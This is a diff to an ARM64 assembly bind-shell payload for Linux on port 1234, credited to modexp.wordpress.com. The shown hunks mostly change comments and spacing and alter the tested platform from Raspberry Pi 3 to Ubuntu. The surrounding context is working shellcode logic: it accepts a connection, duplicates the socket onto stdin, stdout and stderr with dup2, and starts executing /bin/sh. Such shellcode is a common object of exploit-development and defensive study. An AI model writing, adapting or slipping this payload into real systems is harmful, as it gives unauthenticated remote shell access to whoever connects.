@@ -1,6 +1,6 @@
 /**
   bind shell to port 1234
-  tested with linux running on raspberry pi 3  
+  tested with linux running on ubuntu
 
   http://modexp.wordpress.com/   
 */
@@ -34,20 +34,20 @@ _start:
     eor    x1, x1, x1
     eor    x2, x2, x2
     mov    x0, x6        // x0 = s
-    mov    x8, #202     // x8 = 202 = accept    
+    mov    x8, #202      // x8 = 202 = accept    
     svc    1    
     
-    mov    x6, x0       // x7 = r
+    mov    x6, x0        // x7 = r
     
-    // dup(r, FILENO_STDIN);
-    // dup(r, FILENO_STDOUT);
-    // dup(r, FILENO_STDERR);
-    mov    x1, #2       // for 3 descriptors
+    // dup2(r, FILENO_STDIN);
+    // dup2(r, FILENO_STDOUT);
+    // dup2(r, FILENO_STDERR);
+    mov    x1, #2        // for 3 descriptors
 dup_loop:
-    mov    x8, #24      // x8 = dup2 
-    mov    x0, x6       // x0 = r
+    mov    x8, #24       // x8 = dup2 
+    mov    x0, x6        // x0 = r
     svc    1
-    subs   x1, x1, #1       // 
+    subs   x1, x1, #1    // subtract one
     bpl    dup_loop
 
     // execve("/bin/sh", NULL, NULL);    
